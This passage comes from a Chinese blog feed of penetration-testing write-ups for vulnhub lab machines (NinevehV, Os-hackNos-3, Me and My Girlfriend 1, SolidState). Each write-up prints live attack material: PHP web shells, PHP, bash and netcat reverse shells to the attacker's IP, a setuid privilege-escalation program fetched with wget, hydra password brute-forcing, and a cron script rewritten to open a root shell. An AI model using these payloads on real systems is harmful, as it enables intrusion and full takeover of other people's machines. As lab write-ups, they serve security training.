alt="10"></p><p>这次有收获了，看来果然是默认的字典不够强。去访问一下<br><img src="11.png" alt="11"></p><p>是一个登录页面，手工测试一下，发现是先判断用户名，再判断密码是否正确的，那么直接测出来用户名是admin，密码就要爆破了，再次考验你们字典好不好用的时候到了。。。<br><img src="12.png" alt="12"></p><p>密码是<code>1q2w3e4r5t</code>也是一个弱密码。登录进去，点击notes，发现了可能是我们需要的的东西——一个存在文件包含漏洞的页面。<br><img src="13.png" alt="13"></p><p>访问一下抓包访问一下<code>var/tmp/1.php</code><br><img src="14.png" alt="14"></p><p>但是我们这个文件是确实存在的，所以这个<code>No Note is selected</code>应该是人为输出的，经过测试，发现它会判断文件名是否包含ninevehNotes字段，没有就会输出那个错误信息。那我们把数据库的名字改成ninevehNotes1.php就行了。<br><img src="15.png" alt="15"></p><p>看红圈的地方，原本的一句话木马已经被解析了，那我们就上菜刀去连一下，发现连不上，那就不用菜刀了，反正php语句可以执行，那我们尝试直接在网页执行cmd命令，将原来的一句话木马改成<code>&lt;?php exec($_GET[&quot;cmd&quot;],$output); print_r($output); ?&gt;</code>然后试试能不能执行命令。<br><img src="16.png" alt="16"></p><p>可以看到。命令正常执行了。再把cmd命令改成<code>php -v</code>,发现php版本为7.0.18，那么我们直接php反弹shell。使用<code>php -r &#39;$sock=fsockopen(&quot;192.168.0.128&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code>注意啊，坑爹的地方要来了，后面完成渗透测试后我检测过了，这个靶机是连不到外网的，而且也ping不到其它网段的主机，所以如果你的攻击机和靶机不在同一网段的话，那就永远都收不到shell了。所以一开始才要求攻击机和靶机要同一网段！！！，记得抓包发命令的时候把命令URL编码一下，不然无法成功执行</p><p>在kali上面监听<code>nc -lvnp 1234</code>，然后就可以收到shell了，拿到shell后，使用<code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>将它变成交互式shell，更方便操作。<br><img src="17.png" alt="17"></p><p>然后就是枯燥的信息搜集环节了，翻翻找找，在var/www/ssl/secure_notes文件夹的ninevh.png里面夹了私货。<br><img src="18.png" alt="18"></p><p>获得了amrois的RSA私钥，可以无需密码登录他的ssh。但是我们之前扫描的时候22端口没有开启啊。再扫描看看<code>nmap -p 22 192.168.0.150</code><br><img src="19.png" alt="19"></p><p>果然没有正常开启，而是被防火墙过滤了，接着找找其他信息吧。然后在/var/mail文件夹下发现了一封amrois的邮件，内容如下<br><img src="20.png" alt="20"></p><p>让amrois下次敲门，然后给了三个数字。这一看就知道是敲门机制：简单来说就是按照给定顺序访问给定的端口，防火墙就会开启原本设置的端口，逆序访问的话，就会关闭设置的端口。那我们就去敲一敲咯。<br><img src="21.png" alt="21"></p><p>果然是敲门机制，门开了，我们就可以开开心心的用私钥去访问ssh服务了<code>ssh amrois@192.168.0.150 -i key</code><br><img src="22.png" alt="22"></p><p>成功登陆，拿到第一个flag，但是这个账户的权限也很低，之后怎么提权成root，完全没有思路，只能出最后绝招了——求助网上的大佬，看别人的wp。</p><p>大佬的思路：在根目录下面有一个可疑目录report，里面有一些日志文件。<br><img src="23.png" alt="23"><br><img src="24.png" alt="24"></p><p>根据大佬们的经验这个东西就是一个Chkrootkit的检查日志，可以尝试一下Chkrootkit提权<br><img src="25.png" alt="25"></p><p>网上查一查，获得便宜代码一份。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"chown root:root /tmp/update"</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">"chmod 4755 /tmp/update"</span>);</span><br><span class="line"></span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将这个代码放到kali里面编译一下<code>gcc a.c -o update</code>，然后在kali运行<code>python -m SimpleHTTPServer 8000</code>，快速搭建一个http服务，提供一个文件浏览的Web服务。</p><p>然后在靶机的shell那里使用<code>wget 192.168.0.128:8000/update</code>下载一下<br><img src="26.png" alt="26"></p><p>然后使用<code>chmod 777 update</code>获得执行update的权利，然后执行一下。</p><p><img src="27.png" alt="27"></p><p>发现虽然我们还是amrois账户，但是update的owner已经变成root了，再执行一次。<br><img src="28.png" alt="28"></p><p>成功提权成root，去root文件夹下拿flag去。</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> NinevehV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Os-hackNos-3 靶机渗透</title>
      <link href="/2020/03/08/Os-hackNos-3-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2020/03/08/Os-hackNos-3-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>vulnhub的Os-hackNos-3 靶机渗透测试记录</p><a id="more"></a><h1 id="Os-hackNos-3-靶机渗透"><a href="#Os-hackNos-3-靶机渗透" class="headerlink" title="- Os-hackNos-3 靶机渗透"></a>- Os-hackNos-3 靶机渗透</h1><p>这个靶机是根据DHCP自动获取IP，但是使用vmware去装载虚拟机好像只有IPV6地址（官网提示了不建议用vmware装载），IPV4为空，所以为了能够扫描到靶机，我们只能先登录进去然后重新获取IP,去网上搜搜wp，拿到用户名和密码<code>blackdevil Security@x@</code>（心情复杂，用户名和密码都到手了，这还渗透什么。。。)，登录，使用<code>dhclient -r;dhclient</code>命令重新获取IP。至此，准备工作完成。开始渗透。。。</p><p>首先要发现靶机，使用nmap扫描<code>nmap -sP 192.168.183.1/24</code><br><img src="1.png" alt="1"></p><p>得到靶机IP后，之后当然就是扫描靶机开了什么端口、什么服务了<code>nmap -sV -p- --open 192.168.183.137</code><br><img src="2.png" alt="2"></p><p>发现只开了两个端口，一个22，一个80,22是ssh需要用户名和密码，目前我们没有，所以先不考虑。80是个web服务，我们可以去网站看看能不能发现什么。<br><img src="3.png" alt="3"></p><p>发现网站几乎就是空的，只有一张图片和两句话，提示我们要找bug，我们需要一个额外的websec，那么我们就访问一下<code>192.168.183.137/WebSec</code>试试，提示目录不存在，那么换成小写试试<code>192.168.183.137/WebSec</code>成功。<br><img src="4.png" alt="4"></p><p>发现这个新的页面也没什么东西，只有一些网站和一个邮箱可能有用，东西太少了，我们去扫扫网站目录，看有没有什么新东西。kali使用dirb工具<code>dirb http://192.168.183.137/websec</code><br><img src="5.png" alt="5"></p><p>收获颇丰，打了红框的那几个是目前我们比较关注的，就一个个的去看看有什么，发现login是一个邮箱登录界面，admin页面在没有登录的情况下会打开login让你先登录，index是一篇发表的博客，没什么内容<br><img src="6.png" alt="6"><br><img src="7.png" alt="7"></p><p>登录需要邮箱和密码，想想这个网站上面出现的文字里面就有邮箱和一些看起来正常的字符串，可能就包含有用户名和密码，那我们把这些东西收集起来变成字典，爆破一下。kali可以使用cewl字典生成工具<code>cewl http://192.168.183.137/websec -e -d 3 -w 1.txt</code> -e参数是爬取邮箱、-d参数是设定爬取深度，3是指会爬取三层子目录、-w是将结果输出到文件。<br><img src="8.png" alt="8"></p><p>可以看到，字典生成成功，那我们把两个邮箱单独拿出来，作用爆破用的用户名文件，然后其他的全部当成密码。<br><img src="9.png" alt="9"><br><img src="10.png" alt="10"></p><p>字典准备好了，可以开始爆破了，使用hydra爆破<code>hydra -L 2.txt -P 1.txt -t 4 192.168.183.137 http-post-form &quot;/websec/login:username=^USER^&amp;password=^PASS^:wrong email or password&quot;</code><br><img src="11.png" alt="11"></p><p>爆破成功，得到登录的邮箱和密码，那么我们就登录去admin看看。发现后台的content里面有文件管理器，可以自由的上传文件和添加文件。<br><img src="12.png" alt="12"></p><p>那就不用考虑了，先搞个一句话木马上去。直接新增1.php文件或者上传一个一句话木马都行<br><img src="13.png" alt="13"></p><p>发现上传成功了，我们看到新增的一句话木马和robots.txt在同一个目录下面，之前扫目录的时候我们就已经知道了robots.txt的路径为<code>192.168.183.137/websec/robots.txt</code>，那我们去访问一下刚刚上传的一句话木马<code>192.168.183.137/websec/1.php</code>，结果发现页面不对，显示的是index.php的页面<br><img src="14.png" alt="14"></p><p>这个情况是出现了页面跳转，我们打开后台文件管理目录下的<code>。htaccess</code>，在<code>.htaccess</code>文件中的17~23行，意思就是如果访问下面的文件，直接进行访问并解析，不进行跳转。<br><img src="15.png" alt="15"></p><p><code>Rewirte</code>主要的功能就是实现URL的跳转和隐藏真实地址，基于Perl语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等。<br>       <code>RewriteCond</code>指令定义一条规则条件。在一条RewriteRule指令前面可能会有一条或多条RewriteCond指令，只有当自身的模板(pattern)匹配成功且这些条件也满足时规则才被应用于当前URL处理。<br>       所以我们加上<code>RewriteCond %{REQUEST_URL}!1.php</code>，保存后，再去访问试试。<br><img src="16.png" alt="16"></p><p>成功解析，那么我们就可以上中国菜刀连接了。结果发现连接不上，那应该是服务器做了什么限制，所以就只能放弃这个方法了。<br><img src="17.png" alt="17"></p><p>刚刚我们访问1.php的时候，已经证明网站可以正常的解析php文件，那么直接放一个php的webshell上去就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body style="background-color:#424242;"&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- Authenticated --&gt;</span><br><span class="line">&lt;font style=<span class="string">"float:left;"</span> color=<span class="string">"#F1F1F1"</span>&gt;&lt;b&gt;WebShell v<span class="number">.1</span>&lt;/b&gt;&lt;/font&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">&lt;fieldset style=<span class="string">"border:2px solid #ffffff;opacity:0.5;border-radius:5px;background:#1867Ad;"</span>&gt;</span><br><span class="line">&lt;form style=<span class="string">"float:left;color:#ffffff;"</span> action=<span class="string">'&lt;?php echo $_SERVER["PHP_SELF"]?&gt;'</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;b&gt;Run Command:&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type= <span class="string">"text"</span> name=<span class="string">"command"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Make it so!"</span>/&gt;&lt;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;b&gt;System Info:&lt;/b&gt;&lt;p&gt;</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$uname = shell_exec(<span class="string">'uname -a'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$uname&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip_addr = shell_exec(<span class="string">"ip addr | grep inet | grep -v inet6 | awk '&#123;print $2&#125;' | grep -v 127"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$ip_addr&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$disk = shell_exec(<span class="string">"df -h"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$disk&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user = shell_exec(<span class="string">"whoami; id"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$user&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$users = shell_exec(<span class="string">"who -u"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$users&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;form style=<span class="string">"float:right;color:#ffffff;"</span>action=<span class="string">""</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">&lt;b&gt;Remote Upload Path:&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"upload"</span> /&gt; (<span class="keyword">Use</span> <span class="title">full</span> <span class="title">paths</span>)&lt;<span class="title">br</span> /&gt;&lt;<span class="title">br</span> /&gt;</span><br><span class="line">&lt;<span class="title">b</span>&gt;<span class="title">File</span> <span class="title">Upload</span>:&lt;/<span class="title">b</span>&gt;&lt;<span class="title">br</span> /&gt;</span><br><span class="line">&lt;<span class="title">input</span> <span class="title">type</span>="<span class="title">submit</span>" <span class="title">value</span>="<span class="title">Upload</span>!"/&gt;</span><br><span class="line">&lt;<span class="title">input</span> <span class="title">type</span>="<span class="title">file</span>" <span class="title">name</span>="<span class="title">file</span>" /&gt;&lt;<span class="title">P</span>&gt;</span><br><span class="line">&lt;<span class="title">b</span>&gt;<span class="title">Current</span> <span class="title">Remote</span> <span class="title">Directory</span>:&lt;/<span class="title">b</span>&gt;&lt;<span class="title">br</span> /&gt;</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">&lt;?<span class="title">php</span></span><br><span class="line">$<span class="title">pwd</span> = <span class="title">shell_exec</span>("<span class="title">pwd</span>");</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$pwd&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;&lt;/fieldset&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))&#123;</span><br><span class="line">      $errors= <span class="keyword">array</span>();</span><br><span class="line">      $file_name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">      $file_size =$_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>];</span><br><span class="line">      $file_tmp =$_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">      $file_type=$_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];   </span><br><span class="line">      $file_ext=strtolower(end(explode(<span class="string">'.'</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])));</span><br><span class="line">               </span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">empty</span>($errors)==<span class="keyword">true</span>)&#123;</span><br><span class="line">         move_uploaded_file($file_tmp,$_POST[<span class="string">'upload'</span>].$file_name);</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;&lt;span style="font-size: 11px; color: #FFFFFF;"&gt;'</span>;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'Upload: '</span> . $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>] . <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'Size: '</span> . ($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] / <span class="number">1024</span>) . <span class="string">' Kb&lt;br /&gt;'</span>;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'Stored in: '</span> . $_POST[<span class="string">'upload'</span>];</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'&lt;/span&gt;&lt;/pre&gt;'</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         print_r($errors);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">exec_cmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'command'</span>]))&#123;</span><br><span class="line">         $exc = $_POST[<span class="string">'command'</span>]; <span class="keyword">echo</span> shell_exec($exc);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;&lt;span style="font-size:11px;color:#F2F2F2;"&gt;'</span>;</span><br><span class="line">   exec_cmd();</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'&lt;/span&gt;&lt;/pre&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在1.php写入上面的代码，然后访问。<br><img src="18.png" alt="18"></p><p>这样我们就得到了一个可以执行命令的shell，但是在网页上操作不太方便，所以我们首先就反弹shell到我们的kali攻击机上，首先在kali监听端口<code>nc -lvp 1234</code>，然后在网页直接bash反弹shell<code>/bin/bash -c &#39;/bin/bash&gt;/dev/tcp/192.168.183.131/1234 0&gt;&amp;1 2&gt;&amp;1 &amp;&#39;</code><br><img src="19.png" alt="19"></p><p>拿到shell后，使用<code>python -c&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>将它变成交互式的shell</p><p>因为我们现在拿到的权限还不是root，所以使用<code>sudo -l</code>看看自己能够干什么<br><img src="20.png" alt="20"></p><p>好吧，被嘲讽了，看来是不能使用sudo了，那我们就只能找找有没有什么有用的信息了，当前的目录就是我们在网站后台的文件管理你们管理的那个目录，翻找一通，没有什么有用的信息。感觉网站根目录下面应该不会又信息了。直接去<code>/var</code>目录看看。<br><img src="21.png" alt="21"></p><p>该目录下面有这些东西，接着慢慢找呗，发现大部分文件夹都是空的没什么东西，local文件夹下面有一个database文件，打开看看<br><img src="22.png" alt="22"></p><p>发现记录了一个类似账目的东西，感觉很可以，最后又提示了<code>fackespreadsheet</code>，想到fake spreadsheet（假电子表格）编码，那我们就拿去解码试试<br><img src="23.png" alt="23"><br><img src="24.png" alt="24"></p><p>得到了一串字符<code>Security@x@</code>，这个格式和当时登录网站后台的密码格式差不多，猜测应该是一个用户的密码，可以试试是不是root的。然后我们查看记录用户信息的/etc/passwd文件。<br><img src="25.png" alt="25"></p><p>发现一个权限很高，但是不是root的用户，去/home/blackdevil目录下看看<br><img src="26.png" alt="26"></p><p>发现一个空文件，文件名叫做成功提权为admin，那么很有可能就是这个用户，切换下用户试试<code>su blackdevil Security@x@</code><br><img src="27.png" alt="27"></p><p>果然是一个超级账户，有所有的权限，那我们<code>sudo su</code>切换成root，然后修改root的密码，然后访问<code>/root/root.txt</code>。完成本次渗透。<br><img src="28.png" alt="28"><br><img src="29.png" alt="29"></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> Os-hackNos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Me and My Girlfriend 1 靶机渗透</title>
      <link href="/2020/03/08/Me-and-My-Girlfriend-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2020/03/08/Me-and-My-Girlfriend-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>vulnhub的Me and My Girlfriend 1 靶机渗透测试记录</p><a id="more"></a><h1 id="Me-and-My-Girlfriend-1"><a href="#Me-and-My-Girlfriend-1" class="headerlink" title="Me and My Girlfriend 1"></a>Me and My Girlfriend 1</h1><p>首先扫描整个网段，发现靶机IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.183.0&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><p>然后，再扫描靶机开启了什么端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- --open 192.168.183.136</span><br></pre></td></tr></table></figure><p><img src="2.png" alt="2"></p><p>发现靶机只开启了80的web服务、22的ssh服务，那么我们就先去web看看能不能获取一些信息<br><img src="3.png" alt="3"></p><p>打开网站，发现它提示该网站只能本地登录，那么我们就修改我们的IP为本地IP<code>127.0.0.1</code>即可<br><img src="4.png" alt="4"></p><p>成功进入网站，发现没有什么信息，那么我们就先注册一个账号看看能不能得到些信息<br><img src="5.png" alt="5"></p><p>发现登录后，简介页面会显示个人信息及密码，然后这个页面的URL看起来好像可以尝试注入，尝试一下sql注入，发现基本都被过滤了。修改下id，看是否有变化<br><img src="6.png" alt="6"></p><p>个人信息变了，看来存在水平越权漏洞，将username和password信息收集起来。<br><img src="7.png" alt="7"></p><p>收集完后，发现已经没有其他信息了，那么我们就尝试用这些信息去爆破SSH。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L 1.txt -P 1.txt -t 4 ssh:&#x2F;&#x2F;192.168.183.136</span><br></pre></td></tr></table></figure><p><img src="8.png" alt="8"></p><p>成功，获得账号密码alice：4lic3，登录SSH<br><img src="9.png" alt="9"></p><p>登录以后，首先检查登录账户的权限<br><img src="10.png" alt="10"></p><p>发现可以不需要密码以root的权限执行php，那么就使用php反弹shell。先在kali攻击机监听端口<code>nc -lvp 1234</code>，然后反弹shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.183.131&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><p><img src="11.png" alt="11"></p><p>shell反弹成功，可以看到是root的权限，使用<code>python -c&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>命令获得交互式shell，然后就是重新设置root账户的密码。接着就可以去找我们需要的信息了。<br><img src="12.png" alt="12"></p><p>在root文件夹下面找到一个flag2.txt，那应该还有一个flag1.txt才对，而且题目是觉得alice态度奇怪，才让我们进来调查的，所以回到alice的文件夹，再查看所有文件，果然发现了东西。<br><img src="13.png" alt="13"></p><p>查看下两个文件，这么看来应该是在提权和反弹shell前就可以得到的信息。<br><img src="14.png" alt="14"></p><p>flag1.txt要我们接着获取root权限然后去查看flag2，我们已经完成了，至此，本靶机的任务完成。</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> Me and My Girlfriend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SolidState 靶机渗透</title>
      <link href="/2020/03/08/SolidState-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2020/03/08/SolidState-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>vulnhub的solidstate靶机渗透测试</p><a id="more"></a><h1 id="SolidState-靶机渗透"><a href="#SolidState-靶机渗透" class="headerlink" title="SolidState 靶机渗透"></a>SolidState 靶机渗透</h1><p>首要要收集信息，使用nmap扫描网段，获取要渗透的靶机的IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.183.1-254</span><br></pre></td></tr></table></figure><p>这段命令的意思是以ping的方式扫描整个网段<br><img src="1.png" alt="1"></p><p>整个网段发现有5台主机，其中疑似靶机IP的是131和135，131是kali的IP，则靶机IP确定，是192.168.183.135。<br>       接下来要知道靶机开启了哪些端口，并根据端口获取靶机开启了哪些服务的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- --open 192.168.183.135</span><br><span class="line">-sV: Probe open ports to determine service&#x2F;version info</span><br><span class="line">-p: 指定端口扫描，例如-p22扫描22端口、后面的-用来指定扫描范围的，例如-p1-22扫描1-22端口，这里为空，所以扫描所有可能端口</span><br><span class="line">--open: 显示开放的端口</span><br></pre></td></tr></table></figure><p><img src="2.png" alt="2"></p><p>这里可以看到开放的服务，对我们有用的有22端口的ssh服务，80端口的web服务，110端口的pop3邮件服务，以及4555还是james-admin JAMES Remote Admin 2.3.2…存在漏洞。<br>       首先考虑james的那个后台管理可不可以进入，百度之后发现james的后台管理用户名和密码默认都是root，那我们就可以尝试一下。<br><img src="3.png" alt="3"></p><p>果然是默认密码，进入后使用help命令，看看能干什么<br><img src="4.png" alt="4"></p><p>发现了<code>listusers</code>可以输出所有的用户名，<code>setpassword</code>可以修改用户的密码，那么我们接下来就是把所有的用户密码修改一下，然后就可以登录这些账户了。<br><img src="5.png" alt="5"></p><p>像这样把所有用户的密码都重新设置。然后通过110端口登录james的邮箱服务，看看能不能从邮件中获取有效信息。登录所有账户发现只有mindy账户里面有我们需要的信息。<br><img src="6.png" alt="6"></p><p>我们获得了ssh的登录名和密码，接着使用SSH服务连接靶机。<br><img src="7.png" alt="7"></p><p>登录成功，但是这个用户的shell是低等级shell，不能执行大部分的命令，而且只对自己这个文件夹有读写的权限。我们利用<code>cat /etc/passwd</code>命令查看所有用户的信息<br><img src="9.png" alt="9"></p><p>可以看到mindy用户可以利用/bin/rbash/进行反向shell提权，或者利用Apache James Server 2.3.2的漏洞 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzU1MTM=" title="https://www.exploit-db.com/exploits/35513">EDB35513<i class="fa fa-external-link"></i></span>。命令：<code>ssh mindy@192.168.182.139 &quot;export TERM=xterm; python -c &#39;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&#39;&quot;</code>直接利用一句话就能提权<br><img src="10.png" alt="10"></p><p>成功提权，接下来要做的就是反弹shell到kali攻击机。因为前面能进入mindy用户是通过James那里得到的提示，james发了邮件给mindy。所以我们查看下james运行过程<br><img src="11.png" alt="11"></p><p>显示了opt作为根进程，我们进去看看<br><img src="12.png" alt="12"></p><p>发现tmp.py是root权限，而且任意用户都有全部权限，可以利用。直接写入<code>echo &#39;import os; os.system(&quot;/bin/nc 192.168.183.135 1234 -e /bin/bash&quot;)&#39; &gt; /opt/tmp.py</code>，或者在本地创建tmp.py文件，然后wget上传到tmp目录cp放到opt目录运行即可。这个大约两三分钟自动运行一次，我们在攻击机监听端口即可<code>nv -vlp 1234</code><br><img src="13.png" alt="13"></p><p>成功反弹shell，权限也是root权限。<br><img src="14.png" 